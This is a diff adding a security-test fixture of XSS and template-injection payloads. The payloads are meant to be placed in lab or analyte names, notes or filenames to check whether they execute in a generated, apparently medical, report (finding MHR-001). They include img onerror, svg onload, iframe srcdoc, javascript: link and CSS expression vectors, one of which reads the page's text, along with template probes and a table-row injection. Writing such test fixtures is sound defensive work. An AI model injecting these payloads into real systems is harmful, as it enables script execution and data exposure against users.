@@ -1,0 +1,15 @@
+# Payloads for the RENDERING path — extracted text that reaches the DOM.
+# Use as a lab/analyte name, a free-text note, or a filename, then check
+# whether it executes in the generated report (finding MHR-001).
+<img src=x onerror=console.log('MHR-XSS')>
+<svg onload=console.log('MHR-XSS')>
+"><img src=x onerror=console.log('MHR-XSS')>
+'><script>console.log('MHR-XSS')</script>
+<iframe srcdoc="<script>console.log('MHR-XSS')</script>">
+<a href="javascript:console.log('MHR-XSS')">HbA1c</a>
+<div style="width:expression(console.log('MHR-XSS'))">
+&lt;img src=x onerror=console.log('MHR-XSS')&gt;
+<img src=x onerror=console.log(document.body.innerText)>
+{{7*7}}
+${7*7}
+<td></td></tr><tr><td>injected row
